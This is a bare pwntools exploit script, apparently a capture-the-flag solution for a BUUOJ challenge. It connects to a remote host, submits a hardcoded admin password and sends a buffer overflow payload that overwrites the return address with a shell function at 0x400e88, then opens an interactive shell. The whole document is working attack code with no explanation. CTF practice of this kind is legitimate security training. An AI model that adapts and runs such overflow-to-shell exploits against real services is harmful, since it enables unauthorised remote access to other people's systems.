from pwn import *

io = remote('node4.buuoj.cn',26347)

shell = 0x400e88
io.sendlineafter(': ','admin')
io.sendlineafter(': ','2jctf_pa5sw0rd'+'\x00'*58+p64(shell))

io.interactive()